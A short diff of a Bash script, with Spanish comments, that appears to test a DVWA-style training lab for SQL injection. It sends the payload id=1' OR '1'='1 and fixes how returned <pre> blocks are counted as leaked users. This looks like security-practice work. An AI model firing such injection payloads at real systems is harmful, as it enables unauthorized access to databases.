@@ -78,8 +78,8 @@ sqli_exploit() {
     local test_url="$TARGET_URL/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit"
     local test_result=$(curl -s -L -b "$COOKIE_FILE" "$test_url")
 
-    # Contar bloques <pre>
-    local pre_count=$(echo "$test_result" | grep -c "<pre>")
+    # Contar bloques <pre> (pueden estar en una sola línea)
+    local pre_count=$(echo "$test_result" | grep -o "<pre>" | wc -l)
 
     if [ "$pre_count" -gt 1 ]; then
         log "✓ SQL Injection VULNERABLE ($pre_count usuarios)"
